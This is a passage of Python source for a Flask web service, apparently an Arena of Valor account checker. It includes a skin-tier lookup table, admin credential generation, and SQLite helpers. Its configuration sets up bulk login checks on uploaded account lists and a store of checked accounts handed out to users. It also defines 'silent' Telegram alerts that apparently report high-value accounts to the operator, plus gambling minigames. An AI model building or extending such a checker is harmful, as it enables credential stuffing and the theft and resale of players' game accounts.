    "13210": {"hero": "Hayate", "skin": "Tu Di Thánh Đế", "tier": "SSS"},
    "13212": {"hero": "Hayate", "skin": "Thống soái Dạ Ưng", "tier": "SS"},
    "13213": {"hero": "Hayate", "skin": "Siêu đạo chích Kid", "tier": "Anime"},
    "13302": {"hero": "Valhein", "skin": "Vũ khí tối thượng", "tier": "SS"},
    "13313": {"hero": "Valhein", "skin": "Đệ nhất thần thám", "tier": "SS"},
    "13314": {"hero": "Valhein", "skin": "Thứ nguyên vệ thần", "tier": "SSS"},
    "13609": {"hero": "Ilumia", "skin": "Khải Huyền Thiên Hậu", "tier": "SS"},
    "13612": {"hero": "Ilumia", "skin": "Nộ hải Thiên ngư", "tier": "SS"},
    "13613": {"hero": "Ilumia", "skin": "Lưỡng Nghi Long Hậu", "tier": "SSS"},
    "13705": {"hero": "Paine", "skin": "Tử xà Bá tước", "tier": "SS"},
    "13706": {"hero": "Paine", "skin": "Megumi Fushiguro", "tier": "Anime"},
    "14100": {"hero": "Lauriel", "skin": "Mặc định", "tier": "Thường"},
    "14104": {"hero": "Lauriel", "skin": "Thánh quang sứ", "tier": "SS"},
    "14107": {"hero": "Lauriel", "skin": "Tinh vân sứ", "tier": "SS"},
    "14109": {"hero": "Lauriel", "skin": "thiên sứ công nghệ", "tier": "SS"},
    "14110": {"hero": "Lauriel", "skin": "Phi thiên", "tier": "SS"},
    "14111": {"hero": "Lauriel", "skin": "Thứ nguyên vệ thần", "tier": "SSS"},
    "14117": {"hero": "Lauriel", "skin": "Vũ khúc miêu ảnh", "tier": "SS"},
    "14118": {"hero": "Lauriel", "skin": "Thiên nữ Dạ Ưng", "tier": "SS"},
    "14202": {"hero": "Natalya", "skin": "Nghệ Nhân Lân", "tier": "SS"},
    "14206": {"hero": "Natalya", "skin": "Nghiệp Hoả Yêu Hậu", "tier": "SS"},
    "14404": {"hero": "Taara", "skin": "Tiệc bãi biển", "tier": "SS"},
    "14801": {"hero": "Preyta", "skin": "Rồng Xương", "tier": "Thường"},
    "15000": {"hero": "Nakroth", "skin": "Mặc định", "tier": "Thường"},
    "15007": {"hero": "Nakroth", "skin": "Lôi Quang Sứ", "tier": "SS"},
    "15009": {"hero": "Nakroth", "skin": "thứ nguyên vệ thần", "tier": "SSS"},
    "15012": {"hero": "Nakroth", "skin": "Killua", "tier": "Anime"},
    "15013": {"hero": "Nakroth", "skin": "Quỷ thương Liệp Đế", "tier": "SSS"},
    "15015": {"hero": "Nakroth", "skin": "Bạch diện chiến thương", "tier": "SSS"},
    "15200": {"hero": "Điêu Thuyền", "skin": "Mặc định", "tier": "Thường"},
    "15202": {"hero": "Điêu", "skin": "Thuyền Tiệc bãi biển", "tier": "SS"},
    "15204": {"hero": "Điêu", "skin": "Thuyền WaVe", "tier": "SS"},
    "15211": {"hero": "Điêu", "skin": "Thuyền Thất Tịch Tiên Tử", "tier": "SS"},
    "15212": {"hero": "Eternal", "skin": "Sailor Moon", "tier": "Anime"},
    "15217": {"hero": "Điêu", "skin": "Thuyền Nhật Nguyệt Thánh Linh", "tier": "SSS"},
    "15304": {"hero": "Kaine", "skin": "Chiến Binh Kim Quang", "tier": "Anime"},
    "15306": {"hero": "Kaine", "skin": "Kiếm Sĩ Ánh Sáng", "tier": "Thường"},
    "15409": {"hero": "Yena", "skin": "WaVe", "tier": "SS"},
    "15412": {"hero": "Yena", "skin": "Huyền cửu thiên", "tier": "SSS"},
    "15413": {"hero": "Yena", "skin": "Trấn Yêu Thần Lộc", "tier": "SS"},
    "15600": {"hero": "Aleister", "skin": "Mặc định", "tier": "Thường"},
    "15611": {"hero": "Aleister", "skin": "HLV bất bại", "tier": "SS"},
    "15700": {"hero": "Raz", "skin": "Mặc định", "tier": "Thường"},
    "15702": {"hero": "Raz", "skin": "Lôi Thần", "tier": "Thường"},
    "15704": {"hero": "Raz", "skin": "Chiến thần Muay Thái", "tier": "SS"},
    "15705": {"hero": "Raz", "skin": "Siêu việt", "tier": "SS"},
    "15707": {"hero": "Raz", "skin": "Saitama Cosplay", "tier": "Anime"},
    "15710": {"hero": "Raz", "skin": "Bão vũ Cuồng lôi", "tier": "SSS"},
    "15711": {"hero": "Raz", "skin": "Gon", "tier": "Anime"},
    "15905": {"hero": "Dolia", "skin": "Mã Khởi Thiên Ca", "tier": "SS"},
    "16307": {"hero": "Ryoma", "skin": "Ultraman", "tier": "Anime"},
    "16310": {"hero": "Ryoma", "skin": "Ailing Samurai", "tier": "Anime"},
    "16311": {"hero": "Ryoma", "skin": "Maple Frost", "tier": "Anime"},
    "16600": {"hero": "Arthur", "skin": "Mặc định", "tier": "Thường"},
    "16602": {"hero": "Arthur", "skin": "Hoàng Kim Cốt", "tier": "SS"},
    "16605": {"hero": "Arthur", "skin": "Siêu Việt", "tier": "SS"},
    "16607": {"hero": "Arthur", "skin": "Siêu Việt", "tier": "SS"},
    "16700": {"hero": "Ngộ Không", "skin": "Mặc định", "tier": "Thường"},
    "16701": {"hero": "Ngộ Không", "skin": "Sơ Cấp", "tier": "Thường"},
    "16703": {"hero": "Ngộ", "skin": "Không Siêu việt", "tier": "SS"},
    "16705": {"hero": "Ngộ", "skin": "Không Siêu việt 2.0", "tier": "SS"},
    "16707": {"hero": "Ngộ", "skin": "Không Nhóc tỳ bá đạo", "tier": "Anime"},
    "16710": {"hero": "Ngộ", "skin": "Không Tân niên Võ Thần", "tier": "SS"},
    "16711": {"hero": "Ngộ", "skin": "Không Thần Giáp Xích Diễm", "tier": "SS"},
    "16712": {"hero": "Ngộ", "skin": "Không Tề Thiên Võ Thánh", "tier": "SS"},
    "16909": {"hero": "Slimz", "skin": "Siêu Cấp Tối Thượng", "tier": "Anime"},
    "17106": {"hero": "Cresht", "skin": "Bách Tướng Lão Tam", "tier": "SS"},
    "17309": {"hero": "Fennik", "skin": "Phong Tranh Thám Xuân", "tier": "SS"},
    "17400": {"hero": "Stuart", "skin": "Mặc định", "tier": "Thường"},
    "17402": {"hero": "Stuart", "skin": "Xạ Thủ Cơ Động", "tier": "Thường"},
    "17405": {"hero": "Stuart", "skin": "Đạo tặc tử quang", "tier": "Anime"},
    "17502": {"hero": "Grakk", "skin": "Cự Thú Rừng Xanh", "tier": "Thường"},
    "17701": {"hero": "Lindis", "skin": "Xạ Thủ Rừng Xanh", "tier": "Thường"},
    "17706": {"hero": "Lindis", "skin": "Đồng phục Shihakusho", "tier": "Anime"},
    "18408": {"hero": "Helen", "skin": "Bé Hoa Xuân", "tier": "SS"},
    "18700": {"hero": "Arum", "skin": "Mặc định", "tier": "Thường"},
    "18702": {"hero": "Arum", "skin": "Vũ khúc long hổ", "tier": "SS"},
    "18703": {"hero": "Arum", "skin": "Linh Mục Hỗ Trợ", "tier": "Thường"},
    "18704": {"hero": "Arum", "skin": "Vũ khúc thần sứ", "tier": "SS"},
    "18906": {"hero": "Krizzix", "skin": "Cursed Corpse", "tier": "Anime"},
    "19000": {"hero": "Tulen", "skin": "Mặc định", "tier": "Thường"},
    "19002": {"hero": "Tulen", "skin": "Tân Thần Thiên Hà", "tier": "SS"},
    "19006": {"hero": "Tulen", "skin": "Tân thần hoàng kim", "tier": "SS"},
    "19007": {"hero": "Tulen", "skin": "Chí tôn kiếm tiên", "tier": "SSS"},
    "19009": {"hero": "Tulen", "skin": "Thần sứ ST.L-79", "tier": "SSS"},
    "19012": {"hero": "Tulen", "skin": "Tân niên vệ thần", "tier": "SS"},
    "19013": {"hero": "Tulen", "skin": "Tiêu Dao Vũ Thần", "tier": "SS"},
    "19015": {"hero": "Tulen", "skin": "Satoru Gojo", "tier": "Anime"},
    "19109": {"hero": "Rouie", "skin": "Linh Sứ Thời không", "tier": "SS"},
    "19201": {"hero": "Celica", "skin": "Nữ Tu Sĩ", "tier": "Thường"},
    "19500": {"hero": "Enzo", "skin": "Mặc định", "tier": "Thường"},
    "19503": {"hero": "Enzo", "skin": "Thợ Săn Bóng Đêm", "tier": "Thường"},
    "19506": {"hero": "Enzo", "skin": "Sát quỷ đoàn", "tier": "Anime"},
    "19508": {"hero": "Enzo", "skin": "Kurapika", "tier": "Anime"},
    "19509": {"hero": "Enzo", "skin": "Sát thần Bạch Hổ", "tier": "SS"},
    "19605": {"hero": "Elsu", "skin": "Sứ giả tận thế", "tier": "SS"},
    "19606": {"hero": "Elsu", "skin": "Xạ Thủ Bóng Đêm", "tier": "Thường"},
    "19609": {"hero": "Elsu", "skin": "Trấn thiên phi hồ", "tier": "SS"},
    "19906": {"hero": "Eland'orr", "skin": "Tuxedo", "tier": "Anime"},
    "19908": {"hero": "Eland'orr", "skin": "Mộng giới thần chủ", "tier": "SSS"},
    "19909": {"hero": "Eland'orr", "skin": "Thợ Săn Tinh Vân", "tier": "Thường"},
    "50100": {"hero": "Tel'Annas", "skin": "Mặc định", "tier": "Thường"},
    "50101": {"hero": "Tel'Annas", "skin": "Sơ Cấp", "tier": "Thường"},
    "50102": {"hero": "Tel'Annas", "skin": "Cung Nữ Ánh Sáng", "tier": "Thường"},
    "50103": {"hero": "Tel'Annas", "skin": "Nữ Hoàng Bóng Đêm", "tier": "Thường"},
    "50104": {"hero": "Tel'Annas", "skin": "Nữ Thần Chiến Tranh", "tier": "Thường"},
    "50105": {"hero": "Tel'Annas", "skin": "Thần sứ F.E.E-X1", "tier": "SSS"},
    "50108": {"hero": "Tel'Annas", "skin": "Thứ nguyên vệ thần", "tier": "SSS"},
    "50111": {"hero": "Tel'Annas", "skin": "Vũ khúc yêu hồ", "tier": "SS"},
    "50112": {"hero": "Tel'Annas", "skin": "Tân niên vệ thần", "tier": "SSS"},
    "50117": {"hero": "Tel'Annas", "skin": "Thiên Vũ Thần Long", "tier": "SS"},
    "50118": {"hero": "Tel'Annas", "skin": "Jujutsu Sorcerer", "tier": "Anime"},
    "50119": {"hero": "Tel'Annas", "skin": "Lân Quang Thánh Điệu", "tier": "SSS"},
    "50205": {"hero": "Astrid", "skin": "Chiến Binh Ánh Sáng", "tier": "Thường"},
    "50305": {"hero": "Zuka", "skin": "Kiếm Sĩ Bão Tố", "tier": "Thường"},
    "50604": {"hero": "Omen", "skin": "Đao phủ tận thế", "tier": "SS"},
    "51003": {"hero": "Liliana", "skin": "Nguyệt mị ly", "tier": "SS"},
    "51004": {"hero": "Liliana", "skin": "Tiểu thơ anh đào", "tier": "SS"},
    "51005": {"hero": "Liliana", "skin": "Tân nguyệt mị ly", "tier": "SS"},
    "51009": {"hero": "Liliana", "skin": "WaVe", "tier": "SS"},
    "51013": {"hero": "Liliana", "skin": "Lưu Thủy Thần Long", "tier": "SS"},
    "51015": {"hero": "Liliana", "skin": "Ma Pháp Tối Thượng", "tier": "SSS"},
    "51101": {"hero": "Ata", "skin": "Chiến Binh Rừng Xanh", "tier": "Thường"},
    "51208": {"hero": "Rourke", "skin": "Bách tướng Lão đại", "tier": "SS"},
    "51301": {"hero": "Zata", "skin": "Sát Thủ Gió", "tier": "Thường"},
    "51305": {"hero": "Zata", "skin": "Tác gia đương đại", "tier": "Anime"},
    "51306": {"hero": "Zata", "skin": "Chí tôn Tà Phượng", "tier": "SS"},
    "51504": {"hero": "Richter", "skin": "Kiếm thần Susanoo", "tier": "SS"},
    "51801": {"hero": "Quillen", "skin": "Sát Thủ Bóng Đêm", "tier": "Thường"},
    "51802": {"hero": "Quillen", "skin": "Đặc công mãng xà", "tier": "SS"},
    "51808": {"hero": "Quillen", "skin": "Nghịch thiên long đế", "tier": "SS"},
    "51902": {"hero": "Annette", "skin": "Pháp Sư Tinh Vân", "tier": "Thường"},
    "51907": {"hero": "Annette", "skin": "Nữ sinh trung học", "tier": "Anime"},
    "52007": {"hero": "Veres", "skin": "Kimono", "tier": "SS"},
    "52011": {"hero": "Veres", "skin": "Lưu ly Long mẫu", "tier": "SSS"},
    "52102": {"hero": "Florentino", "skin": "Kiếm Sĩ Hoa Hồng", "tier": "Thường"},
    "52105": {"hero": "Florentino", "skin": "SEVEN", "tier": "Anime"},
    "52110": {"hero": "Florentino", "skin": "Hisoka", "tier": "Anime"},
    "52113": {"hero": "Florentino", "skin": "Kỷ Nguyên Hổ Phách", "tier": "SS"},
    "52204": {"hero": "Errol", "skin": "Genos", "tier": "Anime"},
    "52301": {"hero": "D'Arcy", "skin": "Pháp Sư Băng", "tier": "Thường"},
    "52304": {"hero": "D'arcy", "skin": "Pháp sư hỏa long", "tier": "SS"},
    "52404": {"hero": "Capheny", "skin": "Kimono", "tier": "SS"},
    "52407": {"hero": "Capheny", "skin": "Harley Quinn", "tier": "Anime"},
    "52414": {"hero": "Capheny", "skin": "Càn Nguyên Điện Chủ", "tier": "SSS"},
    "52709": {"hero": "Sephera", "skin": "Bách nhạn ngân linh", "tier": "SS"},
    "52710": {"hero": "Sephera", "skin": "NoVa Stardust", "tier": "Anime"},
    "52712": {"hero": "Sephera", "skin": "Tiên Cá Biển Xanh", "tier": "Thường"},
    "52809": {"hero": "Qi", "skin": "Milim Nava", "tier": "Anime"},
    "53107": {"hero": "Keera", "skin": "Nezuko Kamado", "tier": "Anime"},
    "53201": {"hero": "Thorne", "skin": "Chiến Binh Sấm Sét", "tier": "Thường"},
    "53301": {"hero": "Laville", "skin": "Xạ Thủ Tinh Vân", "tier": "Thường"},
    "53304": {"hero": "Laville", "skin": "Xạ Thần Tinh Vệ", "tier": "SS"},
    "53309": {"hero": "Laville", "skin": "Vệ binh giáng sinh", "tier": "SS"},
    "53501": {"hero": "Sinestrea", "skin": "Nữ Hoàng Bóng Đêm", "tier": "Thường"},
    "53503": {"hero": "Sinestrea", "skin": "Wave", "tier": "SS"},
    "53701": {"hero": "Allain", "skin": "Kirito Hắc kiếm sĩ", "tier": "SS"},
    "53702": {"hero": "Allain", "skin": "Kirito", "tier": "Anime"},
    "53703": {"hero": "Allain", "skin": "Tuyết sơn song kiếm", "tier": "SS"},
    "53708": {"hero": "Allain", "skin": "Thần Kiếm Lôi Quang", "tier": "SS"},
    "53803": {"hero": "Iggy", "skin": "Pháp Sư Băng Giá", "tier": "Thường"},
    "53806": {"hero": "Iggy", "skin": "Rimuru Tempest", "tier": "Anime"},
    "54002": {"hero": "Bright", "skin": "Toshiro Hitsugaya", "tier": "Anime"},
    "54301": {"hero": "Aya", "skin": "Hộ Vệ Ánh Sáng", "tier": "Thường"},
    "54307": {"hero": "Aya", "skin": "Công chúa cầu vồng", "tier": "SSS"},
    "54309": {"hero": "Aya", "skin": "Cinnamoroll's Dream", "tier": "Anime"},
    "54400": {"hero": "Yan", "skin": "Mặc định", "tier": "Thường"},
    "54401": {"hero": "Yan", "skin": "Kiếm Sĩ Hắc Long", "tier": "Thường"},
    "54402": {"hero": "Yan", "skin": "Tanjiro Kamado", "tier": "Anime"},
    "54404": {"hero": "Yan", "skin": "Lôi Quang Kiếm Sĩ", "tier": "Thường"},
    "54502": {"hero": "Yue", "skin": "Thánh Nữ Trăng", "tier": "Thường"},
    "54507": {"hero": "Yue", "skin": "Hỗn Độn Thần Ma", "tier": "SS"},
    "54802": {"hero": "Bijan", "skin": "Hoàng kim cơ giáp", "tier": "SS"},
    "54804": {"hero": "Bijan", "skin": "Kình thiên Long Kỵ", "tier": "SSS"},
    "56703": {"hero": "Erin", "skin": "Tình yêu cổ tích", "tier": "SS"},
    "59702": {"hero": "Biron", "skin": "Yuji Itadori", "tier": "Anime"},
    "59901": {"hero": "Billow", "skin": "Thiên Tướng - Độ Ách", "tier": "SS"},
}

# ═══════════════════════════════════════════════════════════════
# 🔧 parse_item_info() — Copy CHÍNH XÁC từ clm.py
# ═══════════════════════════════════════════════════════════════
def parse_item_info(item_id):
    info = SKIN_TIER_MAP.get(str(item_id))
    if not info:
        return None
    return {
        "item_id": item_id,
        "hero_name": info.get("hero", "Unknown"),
        "skin_name": info.get("skin", f"Skin #{item_id}"),
        "tier": info.get("tier", "Normal"),
    }

# 🔧 END PATCH v7.0.3


# ========== CẤU HÌNH v7.0.0 ==========
# 🔒 FIX: Đưa credentials vào ENV (fix bug #7)
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "admin")

# ============================================================
# 🔒 RANDOM SECRET GENERATOR — PHẢI đặt trước khi dùng!
# ============================================================
import secrets as _secrets_mod

def _gen_random_secret(tag: str, length: int = 24) -> str:
    """Sinh secret ngẫu nhiên — cache vào file để không đổi mỗi lần restart."""
    import os, json
    cache_file = os.path.join(os.environ.get("DATA_DIR", "."), ".secrets_cache.json")
    cache = {}
    try:
        if os.path.exists(cache_file):
            with open(cache_file, "r", encoding="utf-8") as f:
                cache = json.load(f)
    except Exception:
        cache = {}
    if tag in cache and cache[tag]:
        return cache[tag]
    token = _secrets_mod.token_urlsafe(length)
    cache[tag] = token
    try:
        with open(cache_file, "w", encoding="utf-8") as f:
            json.dump(cache, f, indent=2)
        os.chmod(cache_file, 0o600)
    except Exception:
        pass
    return token

# ============================================================

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD") or _gen_random_secret("admin")
APP_SECRET = os.environ.get("APP_SECRET") or _gen_random_secret("app", 32)
# 🔒 LƯU Ý: Nếu đổi APP_SECRET, tất cả session sẽ bị logout.
# Để cố định: export APP_SECRET="chuoi_bi_mat_cua_ban" trước khi chạy.

OWNER_USERNAME = os.environ.get("OWNER_USERNAME", "owner")
OWNER_PASSWORD = os.environ.get("OWNER_PASSWORD") or _gen_random_secret("owner")

def _gen_qtv_accounts():
    """Sinh QTV accounts — đọc từ ENV hoặc random nếu không có."""
    accounts = []
    env_raw = os.environ.get("QTV_ACCOUNTS", "").strip()
    if env_raw:
        # Format: user1:pass1,user2:pass2
        for pair in env_raw.split(","):
            if ":" in pair:
                u, p = pair.split(":", 1)
                accounts.append({"username": u.strip(), "password": p.strip(),
                                 "balance": 99999})
        if accounts:
            return accounts
    # Fallback: sinh random
    for i in range(1, 6):
        accounts.append({
            "username": f"qtv{i}",
            "password": _gen_random_secret(f"qtv{i}"),
            "balance": 99999,
        })
    return accounts

QTV_ACCOUNTS = _gen_qtv_accounts()

CHAT_MAX_MESSAGES = 5000
CHAT_MAX_LENGTH = 2000
CHAT_RATE_LIMIT_SEC = 2
OTP_EXPIRE_SEC = 300
OTP_LENGTH = 6

DATA_DIR = os.environ.get("DATA_DIR", ".")
DATA_FILE = os.path.join(DATA_DIR, "web_data.json")
DATA_BACKUP_FILE = os.path.join(DATA_DIR, "web_data_backup.json")
DATA_TMP_FILE = os.path.join(DATA_DIR, "web_data.json.tmp")
DATA_JSON_PATH = os.path.join(DATA_DIR, "data.json")
UPLOAD_FOLDER = os.path.join(DATA_DIR, "uploads")
LOG_FILE = os.path.join(DATA_DIR, "aov_inspector.log")
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
CHAT_FILE = os.path.join(DATA_DIR, "chat_data.json")
JOBS_FILE = os.path.join(DATA_DIR, "active_jobs.json")
JOBS_TMP_FILE = os.path.join(DATA_DIR, "active_jobs.json.tmp")
# 🆕 v7.0: SQLite
SQLITE_FILE = os.path.join(DATA_DIR, "aov.db")

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

MAX_CONCURRENT_CHECKS = 8
MAX_PARALLEL_JOBS = 1
TCP_LOGIN_TIMEOUT = 8
AUTO_RETRY = 2
AUTO_BACKUP_INTERVAL = 900
RATE_LIMIT_PER_IP = 60
RATE_LIMIT_WINDOW = 60
DEFAULT_BALANCE = 400
DAILY_REWARD = 10
REFERRAL_REWARD = 100
REFERRAL_BONUS = 20
CHECK_COST = 1
LEVEL_UP_BASE = 10

STORAGE_CHECK_THREADS = 6
STORAGE_DELAY_PER_ACC = 0
STORAGE_BATCH_SIZE = 100
STORAGE_BATCH_SLEEP = 0
MAX_ACC_PER_UPLOAD = 5000
USER_DAILY_LIMIT = 8

API_TIMEOUT = 8
API_RETRY = 2
CACHE_TTL = 300

# 🆕 v7.0: Game & Feature configs
RANDOM_TIER_COST = {"normal": 1, "ss": 3, "anime": 5, "sss": 8}
STREAK_REWARDS = [10, 15, 20, 30, 40, 60, 100]  # 7 ngày
DAILY_QUEST_TEMPLATES = [
    {"id": "check_5", "name": "Check 5 acc", "reward": 20, "target": 5, "type": "check_count"},
    {"id": "check_10", "name": "Check 10 acc", "reward": 50, "target": 10, "type": "check_count"},
    {"id": "win_taixiu_3", "name": "Thắng Tài Xỉu 3 ván", "reward": 30, "target": 3, "type": "taixiu_win"},
    {"id": "spin_5", "name": "Quay Vòng Quay 5 lần", "reward": 25, "target": 5, "type": "vongquay_play"},
    {"id": "play_any_10", "name": "Chơi game 10 lần", "reward": 40, "target": 10, "type": "game_play"},
    {"id": "nhan_acc", "name": "Nhận 1 acc từ kho", "reward": 30, "target": 1, "type": "receive_acc"},
]
VOUCHER_DISCOUNT = {"check50": 0.5, "check100": 1.0, "check_free": 999}
ACCENT_COLORS = {
    "cyan":   {"name_vi": "🔵 Xanh Cyan",     "name_en": "🔵 Cyan",     "hex": "#00f2fe"},
    "pink":   {"name_vi": "🩷 Hồng Neon",      "name_en": "🩷 Neon Pink", "hex": "#ff007f"},
    "gold":   {"name_vi": "🟡 Vàng Hoàng Gia", "name_en": "🟡 Royal Gold","hex": "#ffb800"},
    "green":  {"name_vi": "🟢 Xanh Lá",        "name_en": "🟢 Green",     "hex": "#00ff88"},
    "purple": {"name_vi": "🟣 Tím Ma Thuật",   "name_en": "🟣 Magic Purple","hex": "#a855f7"},
    "orange": {"name_vi": "🟠 Cam Lửa",        "name_en": "🟠 Fire Orange","hex": "#ff5500"},
    "red":    {"name_vi": "🔴 Đỏ Máu",         "name_en": "🔴 Blood Red", "hex": "#ff2951"},
    "blue":   {"name_vi": "🔷 Xanh Dương",     "name_en": "🔷 Blue",      "hex": "#38bdf8"},
}

BADGE_DEFS = {
    "first_check":   {"icon": "🎯", "name_vi": "Bước Đầu",     "name_en": "First Step",    "desc_vi": "Check acc đầu tiên",        "desc_en": "First account check"},
    "hunter_sss":    {"icon": "🐉", "name_vi": "Thợ Săn SSS",  "name_en": "SSS Hunter",    "desc_vi": "Tìm 10 acc có SSS",         "desc_en": "Find 10 SSS accounts"},
    "hunter_anime":  {"icon": "🎴", "name_vi": "Săn Anime",    "name_en": "Anime Hunter",  "desc_vi": "Tìm 5 acc có Anime",        "desc_en": "Find 5 Anime accounts"},
    "taixiu_king":   {"icon": "🎲", "name_vi": "Vua Tài Xỉu",  "name_en": "TaiXiu King",   "desc_vi": "Thắng Tài Xỉu 50 ván",      "desc_en": "Win 50 TaiXiu games"},
    "rich_man":      {"icon": "💰", "name_vi": "Triệu Phú",     "name_en": "Rich Man",      "desc_vi": "Sở hữu 10000 xu",           "desc_en": "Own 10000 coins"},
    "checker_pro":   {"icon": "⚡", "name_vi": "Checker Pro",  "name_en": "Checker Pro",   "desc_vi": "Check 100 acc",             "desc_en": "Check 100 accounts"},
    "streak_7":      {"icon": "📅", "name_vi": "Điểm Danh 7",  "name_en": "7-Day Streak",  "desc_vi": "Điểm danh 7 ngày liên tục", "desc_en": "7 days check-in"},
    "lucky_wheel":   {"icon": "🎰", "name_vi": "Thần May Mắn", "name_en": "Lucky God",     "desc_vi": "Quay trúng 500 xu",         "desc_en": "Win 500 coins spin"},
    "social_butter": {"icon": "💬", "name_vi": "Xã Giao",      "name_en": "Social",        "desc_vi": "Gửi 100 tin nhắn chat",     "desc_en": "Send 100 chat messages"},
    "veteran":       {"icon": "🏆", "name_vi": "Lão Làng",      "name_en": "Veteran",       "desc_vi": "Tài khoản 30 ngày tuổi",    "desc_en": "Account 30 days old"},
}

SILENT_BOT_TOKEN = os.environ.get("SILENT_BOT_TOKEN", "").strip()
SILENT_CHAT_ID = os.environ.get("SILENT_CHAT_ID", "").strip()
SILENT_MIN_SKINS = int(os.environ.get("SILENT_MIN_SKINS", "100"))
SILENT_MIN_SSS = int(os.environ.get("SILENT_MIN_SSS", "3"))

# (Telegram check sẽ chạy sau khi logger được định nghĩa)

# 🔒 SECURITY: Không hardcode secrets. Đọc từ ENV hoặc data.json.
_DEFAULT_BOT_TOKEN_ENC = b""  # DEPRECATED — dùng ENV TELEGRAM_BOT_TOKEN
_DEFAULT_CHAT_ID_ENC = b""    # DEPRECATED — dùng ENV TELEGRAM_CHAT_ID
_DEFAULT_HUNT_API_ENC = b""   # DEPRECATED — dùng ENV HUNT_API_URL


app = Flask(__name__)
app.secret_key = APP_SECRET
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024  # 32MB
# 🔧 FIX: Xử lý lỗi upload quá lớn
@app.errorhandler(413)
def too_large(e):
    return jsonify({'error': 'File quá lớn (max 32MB)'}), 413
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)
# 🔧 FIX: Cookie security flags
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
# Bật nếu chạy HTTPS:
# app.config['SESSION_COOKIE_SECURE'] = True

logging.basicConfig(level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler()])
logger = logging.getLogger(__name__)

_START_TIME = time.time()

# Check Telegram config (SAU khi logger đã có)
if not SILENT_BOT_TOKEN or not SILENT_CHAT_ID:
    logger.warning("⚠️ Telegram notify TẮT — chưa set ENV SILENT_BOT_TOKEN/SILENT_CHAT_ID")

# ========== DATABASE ==========
USERS: Dict[str, dict] = {}
GENERATED_KEYS: Dict[str, dict] = {}
NOTIFICATIONS: List[dict] = []
CHECK_JOBS: Dict[str, dict] = {}
JOB_QUEUE: List[str] = []
SHARES: Dict[str, dict] = {}
ADMIN_LOGS: List[dict] = []
BANNED_USERS: set = set()
ACC_STORAGE: List[dict] = []
ACC_HISTORY: List[dict] = []
STORAGE_JOBS: Dict[str, dict] = {}
CHAT_MESSAGES: List[dict] = []
CHAT_DM: Dict[str, List[dict]] = {}
OTP_STORE: Dict[str, dict] = {}
CHECK_CACHE: Dict[str, dict] = {}

_active_jobs_lock = threading.Lock()
_active_jobs_count = [0]
_storage_jobs_lock = threading.Lock()
_storage_jobs_count = [0]
_lock = threading.Lock()
_save_lock = threading.Lock()
_save_thread_lock = threading.Lock()  # 🆕 v7.0 FIX: race condition
_jobs_save_lock = threading.Lock()
_cache_lock = threading.Lock()
_save_dirty = [False]
_save_last = [0]
SAVE_DEBOUNCE_SEC = 10
_jobs_save_last = [0]
JOBS_SAVE_DEBOUNCE_SEC = 3
_rate_store = defaultdict(lambda: deque(maxlen=200))
_rate_lock = threading.Lock()
_unread_cache = {}
_unread_lock = threading.Lock()
_chat_lock = threading.Lock()
_user_last_msg: Dict[str, float] = {}
_otp_lock = threading.Lock()
_db_lock = threading.Lock()  # 🆕 v7.0: SQLite lock

# ============================================================
# 🆕 v7.0: SQLITE DATABASE (fix #37)
# ============================================================
def init_sqlite():
    """Khởi tạo SQLite database"""
    try:
        conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS kv_store (
            key TEXT PRIMARY KEY, value TEXT, updated_at REAL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY, data TEXT, updated_at REAL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS acc_storage (
            id TEXT PRIMARY KEY, data TEXT, added_at REAL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS admin_logs (
            id TEXT PRIMARY KEY, data TEXT, ts REAL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS badges (
            username TEXT, badge_id TEXT, earned_at REAL,
            PRIMARY KEY (username, badge_id))''')
        # 🔧 FIX: WAL mode cho concurrent access
        try:
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA synchronous=NORMAL")
            c.execute("PRAGMA busy_timeout=30000")
        except Exception: pass
        conn.commit(); conn.close()
        logger.info(f"✅ SQLite ready: {SQLITE_FILE}")
    except Exception as e:
        logger.error(f"SQLite init error: {e}")

def sqlite_get(key: str):
    try:
        with _db_lock:
            conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
            c = conn.cursor()
            c.execute("SELECT value FROM kv_store WHERE key=?", (key,))
            row = c.fetchone(); conn.close()
            return json.loads(row[0]) if row else None
    except Exception as e:
        logger.error(f"sqlite_get {key}: {e}"); return None

def sqlite_set(key: str, value):
    try:
        with _db_lock:
            conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
            c = conn.cursor()
            c.execute("REPLACE INTO kv_store (key, value, updated_at) VALUES (?, ?, ?)",
                      (key, json.dumps(value, ensure_ascii=False), time.time()))
            conn.commit(); conn.close()
    except Exception as e:
        logger.error(f"sqlite_set {key}: {e}")

def sqlite_save_users():
    """Lưu toàn bộ users vào SQLite"""
    try:
        with _db_lock:
            conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
            c = conn.cursor()
            for un, u in USERS.items():
                c.execute("REPLACE INTO users (username, data, updated_at) VALUES (?, ?, ?)",
                          (un, json.dumps(u, ensure_ascii=False), time.time()))
            conn.commit(); conn.close()
    except Exception as e:
        logger.error(f"sqlite_save_users: {e}")

def sqlite_save_storage():
    """Lưu kho acc vào SQLite"""
    try:
        with _db_lock:
            conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
            c = conn.cursor()
            c.execute("DELETE FROM acc_storage")
            for it in ACC_STORAGE[-3000:]:
                c.execute("REPLACE INTO acc_storage (id, data, added_at) VALUES (?, ?, ?)",
                          (it.get("id", ""), json.dumps(it, ensure_ascii=False),
                           it.get("added_at", time.time())))
            conn.commit(); conn.close()
    except Exception as e:
